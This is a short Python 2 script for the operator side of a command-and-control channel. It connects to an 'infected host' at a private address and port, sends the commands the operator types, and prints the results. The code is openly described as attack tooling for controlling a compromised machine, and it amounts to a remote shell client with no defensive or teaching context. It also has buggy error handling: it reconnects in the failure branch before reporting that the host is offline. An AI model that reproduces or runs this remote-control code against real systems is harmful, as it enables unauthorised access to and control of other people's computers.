import socket ,os ,sys

infected_host = ('192.168.170.128', 50003)

def checkifup():
	try: #try to establish socket and connect to listener on the infected host
		s = socket.socket() #create a socket object
		s.connect(infected_host) #connected to infected host
		executecommands(s)
	except: #if a connection can not be made then the host must be offline
		s = socket.socket() #create a socket object
		s.connect(infected_host) #connected to infected host
		print 'Host is offline' 
		sys.exit()

def executecommands(s):	
	while True: #infinte loop, keep asking for commands
		try: #try to establish socket and connect to listener on the infected host
			#s = socket.socket() #create a socket object
			#s.connect(infected_host) #connected to infected host
			data = s.recv(1024)
			if data == 'C2 offline.. trying again in 5seconds':
				break
			else:
				command = raw_input('Enter Command:') #get command
				s.send(command)
				data = s.recv(1024)
				print data
			#	s.shutdown(socket.SHUT_WR) #close port gracefully 
			#	s.close
		except: #if a connection can not be made then the host must be offline
			break
	checkifup()
			
checkifup()


